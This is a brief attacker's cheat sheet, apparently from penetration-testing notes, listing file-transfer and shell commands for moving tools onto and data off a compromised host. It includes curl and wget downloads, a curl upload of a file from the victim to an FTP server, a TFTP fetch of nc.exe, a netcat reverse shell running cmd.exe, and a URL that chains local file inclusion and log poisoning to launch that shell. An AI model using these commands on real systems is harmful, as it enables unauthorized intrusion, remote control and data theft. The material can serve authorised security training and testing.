# Linux

```
# Python web server
python -m SimpleHTTPServer 8080

wget http://172.20.1.6/file.exe
curl http://172.20.1.6/file.exe -o file.exe

# FTP Server
twistd -n ftp -p 21 --root /path/
# In victim: 
curl -T out.txt ftp://10.10.15.229

# TFTP Server
# In Kali
atftpd --daemon --port 69 /tftp
# In reverse Windows
tftp -i 10.11.1.111 GET nc.exe
nc.exe -e cmd.exe 10.11.1.111 4444
# Example:
http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444
```
